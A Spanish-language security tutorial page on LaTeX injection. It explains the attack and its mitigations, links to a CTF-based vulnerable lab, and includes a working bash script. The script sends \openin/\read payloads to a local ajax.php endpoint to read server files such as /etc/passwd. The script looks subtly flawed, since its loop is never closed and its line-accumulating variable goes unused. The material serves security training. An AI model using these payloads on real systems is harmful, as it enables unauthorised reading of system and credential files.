---
title: Inyecciones LATEX
---
Las **inyecciones LaTeX** son un tipo de ataque que se aprovecha de las vulnerabilidades en las aplicaciones web que permiten a los usuarios ingresar **texto formateado** en LaTeX. LaTeX es un sistema de composición de textos que se utiliza comúnmente en la escritura académica y científica.

Los ataques de inyección LaTeX ocurren cuando un atacante ingresa código LaTeX malicioso en un campo de entrada de texto que luego se procesa en una aplicación web. El código LaTeX puede ser diseñado para aprovechar vulnerabilidades en la aplicación y **ejecutar código malicioso** en el servidor.

Un ejemplo de una inyección LaTeX podría ser un ataque que aprovecha la capacidad de LaTeX para incluir gráficos y archivos en una aplicación web. Un atacante podría enviar un código LaTeX que incluya un enlace a un archivo malicioso, como un virus o un troyano, que podría infectar el servidor o los sistemas de la red.

Para evitar las inyecciones LaTeX, las aplicaciones web deben validar y limpiar adecuadamente los datos que se reciben antes de procesarlos en LaTeX. Esto incluye la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en LaTeX.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades de la aplicación para detectar posibles inyecciones. Además, se debe fomentar la educación sobre la seguridad en el uso de LaTeX y cómo evitar la introducción de código malicioso.

A continuación, se os proporciona el enlace correspondiente al proyecto de Github que nos descargamos para desplegar un laboratorio vulnerable donde poder practicar esta vulnerabilidad:

-   **Laboratorio LaTeX Injection**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
-----
## Script en Bash para inyectar comandos
``` bash
#!/usr/bin/bash

# Variables Globales
declare -r main_url="http://localhost/ajax.php"
filename=$1

if [ $1 ]; then
  read_file_to_line="%0A\read\file%20to\line"
  for i in $(seq 1 100); do
    file_to_download=$(curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename%0A\read\file%20to\line%0A\text{\line}%0A\closein\file&template=blank" | grep -i download | awk 'NF{print $NF}') 
    if [ $file_to_download ]; then
      wget $file_to_download &>/dev/null
      file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
      pdftotext $file_to_convert
      file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
      rm $file_to_convert
      cat $file_to_read | head -n 1
      rm $file_to_read
      read_file_to_line+="%0A\read\file%20to\line"
    else
      read_file_to_line+="%0A\read\file%20to\line"
    fi
else
  echo -e "\n[!] Uso: $0 /etc/passwd\n\n"
fi
```
